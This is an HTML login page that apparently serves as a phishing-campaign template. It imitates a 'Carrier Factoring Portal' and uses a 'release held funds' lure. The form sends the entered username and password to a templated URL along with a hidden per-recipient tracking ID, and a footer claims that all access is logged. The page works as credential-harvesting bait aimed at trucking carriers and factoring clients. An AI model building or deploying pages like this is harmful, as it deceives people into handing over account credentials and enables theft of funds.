<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Factoring Portal — Sign in</title>
    <style>
      body { margin: 0; font-family: Calibri, Arial, sans-serif;
             background: #eef0f3; color: #1a1a1a; }
      .hdr { background: #2d4f8a; color: #fff; padding: 14px 24px;
             font-size: 16px; font-weight: 600; }
      .panel { max-width: 420px; margin: 60px auto; background: #fff;
               border: 1px solid #cfd5dc; padding: 28px; border-radius: 4px; }
      h2 { margin: 0 0 4px; font-size: 18px; color: #2d4f8a; }
      p.lead { font-size: 13px; color: #555; margin: 0 0 18px; }
      label { display: block; font-size: 12px; color: #444; margin: 10px 0 4px; }
      input { width: 100%; padding: 8px; box-sizing: border-box;
              border: 1px solid #c0c6cd; border-radius: 3px; font-size: 14px; }
      button { width: 100%; margin-top: 18px; padding: 10px;
               background: #2d4f8a; color: #fff; border: 0; border-radius: 3px;
               font-size: 14px; cursor: pointer; }
      .foot { font-size: 11px; color: #888; text-align: center; margin-top: 14px; }
    </style>
  </head>
  <body>
    <div class="hdr">Carrier Factoring Portal</div>
    <div class="panel">
      <h2>Sign in to release held funds</h2>
      <p class="lead">Authentication required to view hold details and upload POD.</p>
      <form action="{{.URL}}" method="post" autocomplete="off">
        <input type="hidden" name="rid" value="{{.RId}}">
        <label for="u">Account username</label>
        <input id="u" name="account_user" type="text">
        <label for="p">Password</label>
        <input id="p" name="account_pw" type="password">
        <button type="submit">Sign in</button>
      </form>
      <p class="foot">All access logged. Use your factoring-portal credentials.</p>
    </div>
  </body>
</html>
